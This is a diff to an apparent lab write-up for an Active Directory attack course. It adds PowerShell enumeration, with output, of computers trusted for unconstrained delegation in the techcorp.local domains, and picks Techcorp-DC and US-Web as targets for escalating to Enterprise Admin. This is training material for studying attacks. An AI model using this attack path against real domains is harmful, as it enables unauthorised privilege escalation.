@@ -10,6 +10,55 @@ Abuse the Unconstrained Delegation on us-web to get Enterprise Admin privileges 
   
 ## Unconstrained Delegation
 
+Validata unconstrained delegation accross the different domains:
+```
+PS C:\Users\studentuser17> Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Server techcorp.local
+
+
+DistinguishedName : CN=TECHCORP-DC,OU=Domain Controllers,DC=techcorp,DC=local
+DNSHostName       : Techcorp-DC.techcorp.local
+Enabled           : True
+Name              : TECHCORP-DC
+ObjectClass       : computer
+ObjectGUID        : e4f0d437-867f-458f-822e-a144cd765472
+SamAccountName    : TECHCORP-DC$
+SID               : S-1-5-21-2781415573-3701854478-2406986946-1000
+UserPrincipalName :
+
+```
+```
+PS C:\Users\studentuser17> Get-ADComputer -Filter {TrustedForDelegation -eq $true}
+
+
+DistinguishedName : CN=US-DC,OU=Domain Controllers,DC=us,DC=techcorp,DC=local
+DNSHostName       : US-DC.us.techcorp.local
+Enabled           : True
+Name              : US-DC
+ObjectClass       : computer
+ObjectGUID        : 2edf59cf-aa6e-448a-9810-7a81a3d3af16
+SamAccountName    : US-DC$
+SID               : S-1-5-21-210670787-2521448726-163245708-1000
+UserPrincipalName :
+
+DistinguishedName : CN=US-WEB,CN=Computers,DC=us,DC=techcorp,DC=local
+DNSHostName       : US-Web.us.techcorp.local
+Enabled           : True
+Name              : US-WEB
+ObjectClass       : computer
+ObjectGUID        : cb00dc1e-3619-4187-a02b-42f9c964a637
+SamAccountName    : US-WEB$
+SID               : S-1-5-21-210670787-2521448726-163245708-1110
+UserPrincipalName :
+
+```
+In that case the machines selected for unconstrained delgation attack there are th followings:
+
+
+```
+DNSHostName       : Techcorp-DC.techcorp.local
+DNSHostName       : US-Web.us.techcorp.local
+
+```
 Access to US-WEB with webmaster credentials privileges:
 
 ```
